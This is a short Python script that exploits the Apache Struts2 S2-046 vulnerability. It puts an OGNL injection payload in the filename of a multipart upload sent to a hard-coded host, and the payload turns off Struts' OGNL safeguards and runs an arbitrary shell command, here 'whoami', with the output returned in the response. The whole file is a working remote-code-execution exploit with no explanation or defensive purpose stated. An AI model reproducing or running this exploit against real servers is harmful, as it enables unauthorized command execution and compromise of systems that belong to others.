# -*- coding:utf-8 -*-
# python3
__author__ = 'leezp'
__date__ = 20200626
import http.client
import requests

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'  # 仅在HTTP/1.0 下测试成功


class S2():
    def s2_046(self):
        boundary = "-735323031399963166991314520"
        cmd = 'whoami'
        payload = "%{(#lee='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        # print(payload)
        url = 'http://172.16.1.9:8083/doUpload.action'  # http://192.168.1.84:8083/Struts2FileUpload_war/doUpload.action
        headers = {'Content-Type': 'multipart/form-data; boundary=' + boundary + ''}
        data = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"up\"; filename=\"" + payload + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--" + boundary + ""
        r = requests.post(url, headers=headers, data=data)
        print(r.text)


if __name__ == '__main__':
    S2().s2_046()
